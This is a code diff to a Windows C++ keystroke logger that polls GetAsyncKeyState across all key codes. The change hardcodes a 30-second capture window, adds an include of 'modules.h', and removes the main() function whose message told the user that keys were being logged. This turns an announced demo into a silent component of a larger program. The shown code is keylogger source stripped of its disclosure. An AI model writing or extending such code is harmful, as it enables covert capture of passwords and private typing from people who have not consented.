@@ -1,9 +1,9 @@
 #include <windows.h>
-#include <string>
 #include <chrono>
 #include <iostream>
+#include "modules.h"
 
-std::wstring LogKeysForDuration(int durationSeconds) {
+std::wstring LogKeysForDuration() {
     std::wstring loggedKeys;
     auto startTime = std::chrono::steady_clock::now();
     
@@ -11,7 +11,7 @@ std::wstring LogKeysForDuration(int durationSeconds) {
         // Check if duration has elapsed
         auto currentTime = std::chrono::steady_clock::now();
         auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(currentTime - startTime).count();
-        if (elapsed >= durationSeconds) break;
+        if (elapsed >= 30) break;
 
         for (int key = 1; key <= 254; key++) {
             SHORT keyState = GetAsyncKeyState(key);
@@ -44,12 +44,4 @@ std::wstring LogKeysForDuration(int durationSeconds) {
     }
 
     return loggedKeys;
-}
-
-int main() {
-    std::wcout << L"Logging keys for 30 seconds. Please start typing..." << std::endl;
-    std::wstring loggedKeys = LogKeysForDuration(30);
-    std::wcout << L"Logged keys:\n" << loggedKeys << std::endl;
-
-    return 0;
 }
